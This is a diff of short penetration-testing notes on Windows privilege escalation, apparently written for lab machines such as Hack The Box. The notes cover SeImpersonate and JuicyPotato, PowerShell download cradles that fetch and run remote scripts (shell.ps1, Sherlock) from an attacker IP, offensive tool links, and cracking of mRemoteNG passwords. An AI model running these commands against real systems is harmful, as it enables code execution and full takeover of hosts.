@@ -2,13 +2,13 @@
 
 If there is SeImpersonate privilege here you can run the JuicyPotato exploit to get a system shell, and there might be some privileges that you can use if its an AD environment
 
-```text
+```
 whoami /priv
 ```
 
 Once you get a shell on the box, you can run Sherlock to check if you have any vulnerable exploits
 
-```text
+```
 iex(new-object net.webclient).downloadstring('http://10.10.14.28/shell.ps1')
 
 # sometimes when powershell doesn't load properly, its worth to try this way
@@ -17,7 +17,7 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.25/Sherlock.p
 
 if you're on `meterpreter`, run the exploit suggester with both x86 meterpreter and x64 meterpreter.
 
-```text
+```
 # collection of payloads and powershell scripts
 https://github.com/samratashok/nishang
 
@@ -30,3 +30,8 @@ https://github.com/rasta-mouse/Sherlock
 https://github.com/trustedsec/unicorn
 ```
 
+```
+https://0xdf.gitlab.io/2019/09/07/htb-bastion.html#privesc-to-administrator
+
+mremoteng privesc by cracking passwords in the mremoteng xml file..
+```
